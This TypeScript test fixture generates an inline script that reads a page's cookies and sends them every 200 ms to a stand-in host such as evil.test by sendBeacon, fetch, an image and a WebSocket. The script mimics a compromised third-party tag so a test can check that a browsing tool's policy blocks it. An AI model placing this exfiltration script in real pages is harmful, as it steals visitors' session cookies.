// A hostile variant of www's own pages: an inline script, as a compromised third-party tag would
// add, that sends the page's cookies to another host every few hundred milliseconds by every route
// a page has (sendBeacon, fetch over http and https, an image, a WebSocket). It is the site's own
// script, in the page's main world, so the tool partition's policy has to stop it as page-initiated
// traffic. Off unless a test turns it on.

/** Where the beacon sends, and how often. */
export interface PageBeacon {
  /** The host the cookies go to, e.g. evil.test. A DNS name, letters, digits, dots and hyphens. */
  readonly host: string
  readonly port: number
  /** Between rounds. Defaults to 200 ms. */
  readonly intervalMs?: number
}

export const DEFAULT_BEACON_INTERVAL_MS = 200

const HOSTNAME =
  /^(?=.{1,253}$)[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)*$/i

/** Checks a beacon before it goes into a page, since its values are written into a script. */
export function validBeacon(beacon: PageBeacon): Required<PageBeacon> {
  const intervalMs = beacon.intervalMs ?? DEFAULT_BEACON_INTERVAL_MS
  if (typeof beacon.host !== 'string' || !HOSTNAME.test(beacon.host))
    throw new Error('beacon host must be a DNS name')
  if (!Number.isInteger(beacon.port) || beacon.port < 1 || beacon.port > 65_535)
    throw new Error('beacon port must be 1 to 65535')
  if (!Number.isInteger(intervalMs) || intervalMs < 10 || intervalMs > 60_000)
    throw new Error('beacon interval must be 10 ms to 60 s')
  return { host: beacon.host.toLowerCase(), port: beacon.port, intervalMs }
}

/**
 * The script tag. Each round reads document.cookie afresh, so a cookie set after the page loaded
 * leaks too. Every route is wrapped, so one the browser refuses doesn't stop the others.
 */
export function beaconScript(beacon: PageBeacon): string {
  const { host, port, intervalMs } = validBeacon(beacon)
  const authority = JSON.stringify(`//${host}:${port}`)
  return `<script id="page-beacon">(function () {
  var to = ${authority}
  var fire = function () {
    var leak = encodeURIComponent(document.cookie || 'no-cookie')
    var query = '/beacon?c=' + leak
    try { navigator.sendBeacon('http:' + to + query, leak) } catch (e) {}
    try { fetch('http:' + to + query, { method: 'POST', body: leak, mode: 'no-cors' }).catch(function () {}) } catch (e) {}
    try { fetch('https:' + to + query, { mode: 'no-cors' }).catch(function () {}) } catch (e) {}
    try { new Image().src = 'http:' + to + query + '&img=1' } catch (e) {}
    try { var ws = new WebSocket('ws:' + to + '/ws?c=' + leak); ws.onerror = function () {} } catch (e) {}
  }
  fire()
  setInterval(fire, ${intervalMs})
})()</script>`
}
